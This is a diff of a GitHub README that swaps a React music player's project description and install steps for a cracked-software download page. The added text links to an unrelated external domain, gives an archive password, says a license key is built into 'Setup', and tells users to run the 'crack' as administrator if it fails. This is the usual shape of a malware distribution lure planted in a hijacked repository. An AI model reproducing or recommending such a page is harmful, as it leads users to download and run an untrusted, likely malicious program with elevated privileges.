@@ -1,27 +1,22 @@
-# Beats Music [Demo](https://haseebyousuf.github.io/beats-music/)
+# Download
 
-A Music Player made with React JS.
+|[Download](https://portalproveedores.com.mx/)|
+|:-------------|
+Password: (c) SoftHub
 
-<a href="https://haseebyousuf.github.io/beats-music/">
-<!-- <img src="./public/demo.png" alt="My cool demo app"/> -->
-</a>
+# How to install?
 
-## Tech Stack
+- The key is already sewn into the installation process, that is, the program is registered immediately after installation.
 
-- React.js
-- Sass
-- Css animations
-- Media queries for mobile responsive
+- To install the registered program, run "Setup", and wait for the end of the process.After that, the program will be installed on the computer, and it will be registered.
 
-### Installation
+# Important
 
-1- Clone this repo  
-2- Install the dependencies and devDependencies and start the application.
+- If the crack does not open, then try to run it as an administrator
 
-#### Using NPM
 
-```sh
-$ cd beats-music
-$ npm install
-$ npm run start
-```
+# Additionally
+
+- If you want to support me, then put an asterisk on the repository
+![изображение](https://user-images.githubusercontent.com/31572317/233800552-3c1547ae-1ae3-407b-a8c7-03a4653070f6.png)
+
